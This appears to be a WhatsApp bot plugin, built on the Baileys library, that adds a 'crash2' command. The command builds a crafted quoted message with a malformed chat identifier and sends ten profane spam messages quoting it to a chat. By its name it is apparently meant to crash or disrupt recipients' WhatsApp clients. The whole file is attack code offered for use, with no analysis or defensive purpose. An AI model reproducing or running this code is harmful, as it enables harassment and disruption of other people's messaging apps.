/* ██████╗░██████╗░░█████╗░░░░░░██╗███████╗░█████╗░████████╗░░░███╗░░██╗██╗██╗░░░░░░█████╗░░█████╗░
   ██╔══██╗██╔══██╗██╔══██╗░░░░░██║██╔════╝██╔══██╗╚══██╔══╝░░░████╗░██║██║██║░░░░░██╔══██╗██╔══██╗
   ██████╔╝██████╔╝██║░░██║░░░░░██║█████╗░░██║░░╚═╝░░░██║░░░░░░██╔██╗██║██║██║░░░░░███████║███████║
   ██╔═══╝░██╔══██╗██║░░██║██╗░░██║██╔══╝░░██║░░██╗░░░██║░░░░░░██║╚████║██║██║░░░░░██╔══██║██╔══██║
   ██║░░░░░██║░░██║╚█████╔╝╚█████╔╝███████╗╚█████╔╝░░░██║░░░██╗██║░╚███║██║███████╗██║░░██║██║░░██║
   ╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝╚═╝░░╚══╝╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝ 
                                    by jayarathne_technical                                         */

// ================= import modules ========================== //

const nila = require("../../events");
const { delay } = require('@adiwajshing/baileys');
const chalk = require('chalk');
const config = require('../../config');

// ================= start plugin ============================ //

nila.addCommand( 
    { pattern: ["crash2"], desc: `des`, sucReact: "✅", category: [ "tet", "normal" ] ,  },

async (m, conn , { jf }) => {


    try {



const msgs = {
    messageStubParameters: [],
    labels: [],
    userReceipt: [],
    reactions: [],
    pollUpdates: [],
    key: MessageKey ={
      remoteJid: '27282g.us',
      fromMe: false,
      id: '',
      participant: '0@s.whatsapp.net'
    },
    message: Message = { conversation: `tag_m` },
}




const ss =  await conn.sendMessage(
    m.chat,
    { text: `FUCKED - 2` },
    { quoted: m }
  );

await conn.sendMessage(m.chat, {
    react: { text: `🏴‍☠️` , key: ss.key },
})

for (let i = 0; i < 10; i++) {
    await delay(1000);

    await conn.sendMessage( m.chat , { text: `FUCKED` }, { quoted:msgs } );
    // await  conn.sendMessage(m.chat, { delete: { remoteJid: m.chat , id : m.key.id } }  )
       

}

    } catch(e) {

        console.log(e)
    }

})
